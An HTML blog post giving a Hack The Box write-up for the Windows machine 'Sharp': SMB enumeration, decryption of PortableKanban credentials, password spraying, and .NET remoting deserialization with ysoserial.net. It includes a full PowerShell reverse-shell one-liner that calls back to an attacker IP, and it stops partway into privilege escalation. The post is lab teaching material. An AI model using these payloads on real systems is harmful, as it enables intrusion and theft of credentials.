
  
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="siteBaseUrl" content="//luksec.fr">
    <meta name="author" content="Luks">
    <meta name="description" content="">
    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
    <meta name="generator" content="Hugo 0.78.1" />
    <title>
        
           
               Hack The Box - Sharp &vert; Luks
           
        
    </title>
    <meta name="description" content="Hack The Box - Sharp - %!s(&lt;nil&gt;)">
    <meta itemprop="name" content="Hack The Box - Sharp">
    <meta itemprop="description" content="Hack The Box - Sharp - %!s(&lt;nil&gt;)">
    <meta property="og:title" content="Hack The Box - Sharp">
    <meta property="og:description" content="Hack The Box - Sharp - %!s(&lt;nil&gt;)">
    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
    <meta property="og:url" content="//luksec.fr/article/sharp/">
    <meta property="og:site_name" content="Luks">
    <meta property="og:type" content="article">

    


    <script src="/modernizr-simple.js"></script>

    
    <link href="/article/sharp/" rel="alternate" type="application/rss+xml" title="Luks" />
    <link href="/article/sharp/" rel="feed" type="application/rss+xml" title="Luks" />
    

    

    <link rel="stylesheet" href="//luksec.fr/theme.css">

    

    
        
            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
        
    
</head>

<body class="bilberry-hugo-theme">

    
    <nav>

    <div class="container">
        <ul class="topnav">
            
                
                    <li><a href="//luksec.fr/page/notes/">Notes</a></li>
                
            
                
                    <li><a href="//luksec.fr/page/whoami/">Whoami</a></li>
                
            
        </ul>

        
    </div>
</nav>


    
    <header>

        <div class="container">
            <div class="logo" style="border: none;">
                <a href="//luksec.fr" class="logo">
                    
                        <img src="/img/avatar.jpg" alt="">
                    

                    <span class="overlay"><i class="fa fa-home"></i></span>
                </a>
            </div>
            <div class="titles">
                <h3 class="title">
                    <a href="//luksec.fr">
                        Luks
                    </a>
                </h3>

                
            </div>

            <div class="languages">
                
                    
                        <a href="//luksec.fr/" class="active">en</a>
                    
                
                    
                        <a href="//luksec.fr/fr/">fr</a>
                    
                
                </div>
            

            
                <div class="toggler">
            
                    <i class="fa fa-bars" aria-hidden="true"></i>
                </div>
            </div>
    </header>


    <div class="main container">
        
    <div class="article-wrapper u-cf single">
        
            <a class="bubble" href="//luksec.fr/article/sharp/">
    <i class="fas fa-fw fa-pencil-alt"></i>
</a>

<article class="default article">
    

    <div class="content">
    <h1 class="article-title">
        <a href="//luksec.fr/article/sharp/">
            Hack The Box - Sharp
        </a>
    </h1>

    <div class="meta">
        
            
                <span class="date moment">2021-05-12</span>
            
        

        
            
                <span class="readingTime">7 min read</span>
            
        

        
            <span class="categories">
                
                    
                    
                        <a href="//luksec.fr/categories/htb/">HTB</a>
                    
                
                    
                    
                        <a href="//luksec.fr/categories/ctf/">ctf</a>
                    
                
                    
                    
                        <a href="//luksec.fr/categories/write-up/">write-up</a>
                    
                
                    
                    
                        <a href="//luksec.fr/categories/windows/">windows</a>
                    
                
            </span>
        

        
            <span class="author">
                
                
                    <a href="//luksec.fr/author/luks/">Luks</a>
                
            </span>
        
    </div>

    
        

        <p><img src="/img/sharp/sharp-fiche.png" alt=""></p>
<p>Sharp is a hard <a href="https://app.hackthebox.eu/machines/Sharp">machine</a> that was deployed on Hack The Box on Sunday, 6 december 2020 and created by <strong>cube0x0</strong>.</p>
<h1 id="quick-summary">Quick summary</h1>
<nav id="TableOfContents">
  <ul>
    <li><a href="#recon">Recon</a>
      <ul>
        <li><a href="#nmap-scan">Nmap Scan</a></li>
      </ul>
    </li>
    <li><a href="#smb-enumeration">SMB enumeration</a></li>
    <li><a href="#portable-kanban">Portable Kanban</a></li>
    <li><a href="#dnspy">dnSpy</a></li>
    <li><a href="#foothold">Foothold</a>
      <ul>
        <li><a href="#payload-generation">Payload generation</a></li>
        <li><a href="#powershell-reverse-shell">Powershell reverse shell</a></li>
        <li><a href="#exploit-net-remoting">Exploit .NET remoting</a></li>
        <li><a href="#user-lars">User lars</a></li>
      </ul>
    </li>
    <li><a href="#privesc">PrivEsc</a></li>
  </ul>
</nav>
<h2 id="recon">Recon</h2>
<h3 id="nmap-scan">Nmap Scan</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE            VERSION
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8888/tcp open  storagecraft-image StorageCraft Image Manager
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -48m42s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-07T13:04:04
|_  start_date: N/A
</code></pre></div><p>There are :</p>
<ul>
<li>an <code>rpc</code> service on the <code>135/tcp</code> port</li>
<li>an <code>netbios-ssn</code> service on the <code>139/tcp</code> port</li>
<li>an <code>smb</code> service on the <code>445/tcp</code> port</li>
<li>a <code>storagecraft-image</code> service on the <code>8888/tcp</code> port</li>
<li>Windows OS</li>
</ul>
<h2 id="smb-enumeration">SMB enumeration</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/infosec/htb/retired/sharp<span style="color:#f92672">]</span>
└─$ smbmap -H sharp.htb                                                                                                                                                        <span style="color:#ae81ff">1</span> ⨯
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     NO ACCESS
        IPC$                                                    NO ACCESS       Remote IPC
        kanban                                                  READ ONLY
</code></pre></div><p>The <code>kanban</code> share can be accessed as read-only.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/infosec/htb/retired/sharp<span style="color:#f92672">]</span>
└─$ smbmap -H sharp.htb -R kanban                       
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        kanban                                                  READ ONLY
        .<span style="color:#ae81ff">\k</span>anban<span style="color:#ae81ff">\*</span>
        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    .
        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ..
        fr--r--r--            <span style="color:#ae81ff">58368</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    CommandLine.dll
        fr--r--r--           <span style="color:#ae81ff">141312</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    CsvHelper.dll
        fr--r--r--           <span style="color:#ae81ff">456704</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    DotNetZip.dll
        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:59 <span style="color:#ae81ff">2020</span>    Files
        fr--r--r--            <span style="color:#ae81ff">23040</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Rtf.Converter.Html.dll
        fr--r--r--            <span style="color:#ae81ff">75776</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Rtf.Interpreter.dll
        fr--r--r--            <span style="color:#ae81ff">32768</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Rtf.Parser.dll
        fr--r--r--            <span style="color:#ae81ff">19968</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Itenso.Sys.dll
        fr--r--r--           <span style="color:#ae81ff">376832</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    MsgReader.dll
        fr--r--r--           <span style="color:#ae81ff">133296</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Ookii.Dialogs.dll
        fr--r--r--          <span style="color:#ae81ff">2558011</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    pkb.zip
        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    Plugins
        fr--r--r--             <span style="color:#ae81ff">5819</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.cfg
        fr--r--r--           <span style="color:#ae81ff">118184</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.Data.dll
        fr--r--r--          <span style="color:#ae81ff">1878440</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.exe
        fr--r--r--            <span style="color:#ae81ff">31144</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.Extensions.dll
        fr--r--r--             <span style="color:#ae81ff">2080</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.pk3
        fr--r--r--             <span style="color:#ae81ff">2080</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.pk3.bak
        fr--r--r--               <span style="color:#ae81ff">34</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PortableKanban.pk3.md5
        fr--r--r--           <span style="color:#ae81ff">413184</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Common.dll
        fr--r--r--           <span style="color:#ae81ff">137216</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Interfaces.dll
        fr--r--r--           <span style="color:#ae81ff">292352</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Redis.dll
        fr--r--r--           <span style="color:#ae81ff">411648</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ServiceStack.Text.dll
        fr--r--r--          <span style="color:#ae81ff">1050092</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    User Guide.pdf
        .<span style="color:#ae81ff">\k</span>anban<span style="color:#ae81ff">\P</span>lugins<span style="color:#ae81ff">\*</span>
        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    .
        dr--r--r--                <span style="color:#ae81ff">0</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    ..
        fr--r--r--            <span style="color:#ae81ff">64424</span> Sat Nov <span style="color:#ae81ff">14</span> 13:57:04 <span style="color:#ae81ff">2020</span>    PluginsLibrary.dll
</code></pre></div><p>There are several files that are retrieved with <code>smbget</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
└─$ smbget -a -R smb://sharp.htb/kanban                                                                                                                                        <span style="color:#ae81ff">1</span> ⨯
Using workgroup WORKGROUP, guest user
smb://sharp.htb/kanban/CommandLine.dll                                                                                                                                             
smb://sharp.htb/kanban/CsvHelper.dll                                                                                                                                               
smb://sharp.htb/kanban/DotNetZip.dll                                                                                                                                               
smb://sharp.htb/kanban/Itenso.Rtf.Converter.Html.dll                                                                                                                               
smb://sharp.htb/kanban/Itenso.Rtf.Interpreter.dll                                                                                                                                  
smb://sharp.htb/kanban/Itenso.Rtf.Parser.dll                                                                                                                                       
smb://sharp.htb/kanban/Itenso.Sys.dll                                                                                                                                              
smb://sharp.htb/kanban/MsgReader.dll                                                                                                                                               
smb://sharp.htb/kanban/Ookii.Dialogs.dll                                                                                                                                           
smb://sharp.htb/kanban/pkb.zip                                                                                                                                                     
smb://sharp.htb/kanban/Plugins/PluginsLibrary.dll                                                                                                                                  
smb://sharp.htb/kanban/PortableKanban.cfg                                                                                                                                          
smb://sharp.htb/kanban/PortableKanban.Data.dll                                                                                                                                     
smb://sharp.htb/kanban/PortableKanban.exe                                                                                                                                          
smb://sharp.htb/kanban/PortableKanban.Extensions.dll                                                                                                                               
smb://sharp.htb/kanban/PortableKanban.pk3                                                                                                                                          
smb://sharp.htb/kanban/PortableKanban.pk3.bak                                                                                                                                      
smb://sharp.htb/kanban/PortableKanban.pk3.md5                                                                                                                                      
smb://sharp.htb/kanban/ServiceStack.Common.dll                                                                                                                                     
smb://sharp.htb/kanban/ServiceStack.Interfaces.dll                                                                                                                                 
smb://sharp.htb/kanban/ServiceStack.Redis.dll                                                                                                                                      
smb://sharp.htb/kanban/ServiceStack.Text.dll                                                                                                                                       
smb://sharp.htb/kanban/User Guide.pdf                                                                                                                                              
Downloaded 7.90MB in <span style="color:#ae81ff">5</span> seconds
</code></pre></div><h2 id="portable-kanban">Portable Kanban</h2>
<p>Several files are related on the agile project management method <a href="https://www.journaldunet.fr/web-tech/guide-de-l-entreprise-digitale/1443832-kanban-une-methode-agile-de-gestion-de-projet-visuelle-et-continue/">Kanban</a> like <code>PortableKanban.exe</code> or <code>PortableKanban.pk3</code>.</p>
<p>By searching on Google, we find an <a href="https://www.exploit-db.com/exploits/49409">exploit</a> which allows us to recover the creds of users encrypted in <a href="https://fr.wikipedia.org/wiki/Data_Encryption_Standard">DES</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
└─$ python3 exploit.py PortableKanban.pk3
Administrator:G2@$btRSHJYTarg
lars:G123HHrth234gRG
</code></pre></div><p>Transferring files with <code>smbserver</code> to a Windows machine for RE with <code>dnSpy</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
└─$ sudo impacket-smbserver -smb2support -user luks -password luks share <span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
Impacket v0.9.22 - Copyright <span style="color:#ae81ff">2020</span> SecureAuth Corporation

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Callback added <span style="color:#66d9ef">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Config file parsed
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Incoming connection <span style="color:#f92672">(</span>192.168.1.16,50186<span style="color:#f92672">)</span>
</code></pre></div><p><img src="/img/sharp/sharp-share.png" alt=""></p>
<h2 id="dnspy">dnSpy</h2>
<p><a href="https://github.com/dnSpy/dnSpy">dnSpy</a> is a .NET debugger and assembly editor.</p>
<p>The <code>PortableKanban.exe</code> and <code>PortableKanban.Data.dll</code> are opened and the second file contains a <code>Crypto</code> class which contains the <code>Encrypt</code> and <code>Decrypt</code> functions.</p>
<p><img src="/img/sharp/sharp-dnspy.png" alt=""></p>
<p>The code uses an encrypted string as input and decodes the content in base64. We can also see that it is the DES algorithm with a hard-coded key and iv values to decrypt the content.</p>
<p>Creating two wordlists <code>user.txt</code> and <code>password.txt</code> and use <a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> for <a href="https://doubleoctopus.com/security-wiki/threats-and-tools/password-spraying/">password spraying</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/infosec/htb/retired/sharp<span style="color:#f92672">]</span>
└─$ crackmapexec smb sharp.htb -u user.txt -p password.txt 
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:SHARP<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:Sharp<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\A</span>dministrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\A</span>dministrator:G123HHrth234gRG STATUS_LOGON_FAILURE 
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\l</span>ars:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
SMB         10.10.10.219    <span style="color:#ae81ff">445</span>    SHARP            <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Sharp<span style="color:#ae81ff">\l</span>ars:G123HHrth234gRG
</code></pre></div><p>The <code>dev</code> share can be accessed with the <code>lars</code> user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
└─$ smbmap -H sharp.htb -u <span style="color:#e6db74">&#34;lars&#34;</span> -p <span style="color:#e6db74">&#34;G123HHrth234gRG&#34;</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        kanban                                                  NO ACCESS
</code></pre></div><p>Enumeration of shareing and retrieval of files.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
└─$ smbmap -H sharp.htb -u <span style="color:#e6db74">&#34;lars&#34;</span> -p <span style="color:#e6db74">&#34;G123HHrth234gRG&#34;</span> -R dev
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: sharp.htb:445   Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        dev                                                     READ ONLY
        .<span style="color:#ae81ff">\d</span>ev<span style="color:#ae81ff">\*</span>
        dr--r--r--                <span style="color:#ae81ff">0</span> Sun Nov <span style="color:#ae81ff">15</span> 06:30:13 <span style="color:#ae81ff">2020</span>    .
        dr--r--r--                <span style="color:#ae81ff">0</span> Sun Nov <span style="color:#ae81ff">15</span> 06:30:13 <span style="color:#ae81ff">2020</span>    ..
        fr--r--r--             <span style="color:#ae81ff">5632</span> Sun Nov <span style="color:#ae81ff">15</span> 05:25:01 <span style="color:#ae81ff">2020</span>    Client.exe
        fr--r--r--               <span style="color:#ae81ff">70</span> Sun Nov <span style="color:#ae81ff">15</span> 08:59:02 <span style="color:#ae81ff">2020</span>    notes.txt
        fr--r--r--             <span style="color:#ae81ff">4096</span> Sun Nov <span style="color:#ae81ff">15</span> 05:25:01 <span style="color:#ae81ff">2020</span>    RemotingLibrary.dll
        fr--r--r--             <span style="color:#ae81ff">6144</span> Mon Nov <span style="color:#ae81ff">16</span> 06:55:44 <span style="color:#ae81ff">2020</span>    Server.exe

-- snipp --

──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/htb/retired/sharp/smb<span style="color:#f92672">]</span>
└─$ sudo smbget -a -R smb://sharp.htb/dev -U <span style="color:#e6db74">&#34;lars%G123HHrth234gRG&#34;</span>                                                                                                            <span style="color:#ae81ff">1</span> ⨯
Using workgroup WORKGROUP, user lars
smb://sharp.htb/dev/Client.exe                                                                                                                                                     
smb://sharp.htb/dev/notes.txt                                                                                                                                                      
smb://sharp.htb/dev/RemotingLibrary.dll                                                                                                                                            
smb://sharp.htb/dev/Server.exe                                                                                                                                                     
Downloaded 15.57kB in <span style="color:#ae81ff">0</span> seconds
</code></pre></div><p>The <code>notes.txt</code> file reveals some hints.</p>
<p><img src="/img/sharp/sharp-note.png" alt=""></p>
<p>When we analyse the <code>Server.exe</code> file with dnSpy, we find a <code>RemotingSample</code> module which contains two functions:</p>
<ul>
<li><code>Main()</code> which creates a thread and runs <code>Startserver</code>.</li>
</ul>
<p><img src="/img/sharp/sharp-main.png" alt=""></p>
<ul>
<li><code>Startserver()</code> is a service which listen on port <code>8888</code> and exposes the <code>SecretSharpDebugApplicationEndpoint</code> object instance.</li>
</ul>
<p><img src="/img/sharp/sharp-start.png" alt=""></p>
<p>The <code>main()</code> function in <code>client.exe</code> shows the connection on the same endpoint with creds.</p>
<p><img src="/img/sharp/sharp-creds.png" alt=""></p>
<p><code>debug:SharpApplicationDebugUserPassword123!</code></p>
<h2 id="foothold">Foothold</h2>
<p>Searching for <code>export .NET remoting</code> on Google, we find this <a href="https://parsiya.net/blog/2015-11-14-intro-to-.net-remoting-for-hackers/">article</a> which gives an introduction to <code>.NET remoting</code> and this <a href="https://research.nccgroup.com/2019/03/19/finding-and-exploiting-net-remoting-over-http-using-deserialisation/">POC</a> which explains how to exploit this vuln. As well the <a href="https://github.com/parteeksingh005/ExploitRemotingService_Compiled">repo</a> github of <code>Parteek Singh</code> which shows the tools compiled to facilitate the attack.</p>
<p>I download the files to the Windows machine and <a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a> to generate serialized .NET payload.</p>
<h3 id="payload-generation">Payload generation</h3>
<p><img src="/img/sharp/sharp-payload.png" alt=""></p>
<h3 id="powershell-reverse-shell">Powershell reverse shell</h3>
<p>Getting the one-liner reverse shell from the <code>nishang</code><a href="https://github.com/0xLuks/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1">repo</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$client = New-Object System.Net.Sockets.TCPClient(<span style="color:#e6db74">&#34;10.10.14.42&#34;</span>,1337);$stream = $client.GetStream();<span style="color:#66d9ef">[byte[]]</span>$bytes = 0..65535|%{0};<span style="color:#66d9ef">while</span>(($i = $stream.Read($bytes, 0, $bytes.Length)) <span style="color:#f92672">-ne</span> 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + <span style="color:#e6db74">&#34;PS &#34;</span> + (pwd).Path + <span style="color:#e6db74">&#34;&gt; &#34;</span>;$sendbyte = (<span style="color:#66d9ef">[text.encoding]</span>::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
</code></pre></div><p>Creating a python web server</p>
<p><img src="/img/sharp/sharp-python.png" alt=""></p>
<p>Setting up a listener on port <code>1337</code></p>
<p><img src="/img/sharp/sharp-nc.png" alt=""></p>
<h3 id="exploit-net-remoting">Exploit .NET remoting</h3>
<p><img src="/img/sharp/sharp-foothold.png" alt=""></p>
<h3 id="user-lars">User lars</h3>
<p>We get a shell despite the error message as <code>lars</code> and we can retrieve the first <code>user.txt</code> flag.</p>
<p><img src="/img/sharp/sharp-user.txt.png" alt=""></p>
<h2 id="privesc">PrivEsc</h2>
<p>In the user&rsquo;s <code>Documents</code> directory, there is a <code>wcf</code> folder which contains a <code>Visual Studio</code> project.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\lars\Documents\wcf&gt; ls


    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\lars\Documents\wcf


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                .vs
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                Client
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                packages
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>40 PM                RemotingLibrary
d-----       11/15/2020   1<span style="color:#960050;background-color:#1e0010">:</span>41 PM                Server
-a----       11/15/2020  12<span style="color:#960050;background-color:#1e0010">:</span>47 PM           2095 wcf.sln
</code></pre></div><p>I create a <code>wcf.zip</code> archive and put it in the <code>dev</code> share so I can download the files for later analysis locally.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Compress-Archive -Path C:\Users\lars\Documents\wcf -DestinationPath c:\dev\wcf.zip

-- snipp --

PS C:\Users\Luks\Desktop\ysoserial-dotnet&gt; net use G: \\10.10.10.219\dev /user<span style="color:#960050;background-color:#1e0010">:</span>lars G123HHrth234gRG
La commande s<span style="color:#960050;background-color:#1e0010">’</span>est terminée correctement.

PS C:\Users\Luks\Desktop\ysoserial-dotnet&gt; cd ..
PS C:\Users\Luks\Desktop&gt; copy G:\wcf.zip .
PS C:\Users\Luks\Desktop&gt; ls


    Répertoire <span style="color:#960050;background-color:#1e0010">:</span> C:\Users\Luks\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        09/05/2021     04<span style="color:#960050;background-color:#1e0010">:</span>01                ExploitRemotingService_Compiled-main
d-----        08/04/2021     20<span style="color:#960050;background-color:#1e0010">:</span>14                ysoserial-dotnet
-a----        10/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>35          27136 nc.exe
-a----        10/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>45            500 revshell.ps1
-a----        09/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>26           1401 Visual Studio Code.lnk
-a----        10/05/2021     02<span style="color:#960050;background-color:#1e0010">:</span>39       11598452 wcf.zip
</code></pre></div><p>Unpack the archive and open the <code>wcf.sln</code> file in Visual Studio. You can see in <code>Server</code> that this is unsurprisingly the <a href="https://docs.microsoft.com/fr-fr/dotnet/framework/wcf/whats-wcf">wcf</a> service with four methods.</p>
<p><img src="/img/sharp/sharp-wcf.png" alt=""></p>
<p>The <code>OnStart</code> method indicates a service listening on port <code>8889</code> with an endpoint named <code>NewSecretWcfEndpoint</code> and <code>TcpClientCredentialType.Windows</code> as authentification.</p>
<p><img src="/img/sharp/sharp-secret.png" alt=""></p>
<p>In <code>Client</code>, a <code>main()</code> function that connects to the <code>NewSecretWcfEndpoint</code> endpoint at localhost and calls three other functions :</p>
<ul>
<li><code>GetDiskInfo()</code></li>
<li><code>GetCpuInfo()</code></li>
<li><code>GetRamInfo()</code></li>
</ul>
<p><img src="/img/sharp/sharp-client.png" alt=""></p>
<p>Finally, in <code>RemotingLibrary</code>, we find the three functions of <code>client</code> and two others:</p>
<ul>
<li><code>GetUsers()</code></li>
<li><code>InvokePowershell()</code></li>
</ul>
<p>The second is interesting because it allows you to execute text in powershell.</p>
<p><img src="/img/sharp/sharp-pw.png" alt=""></p>
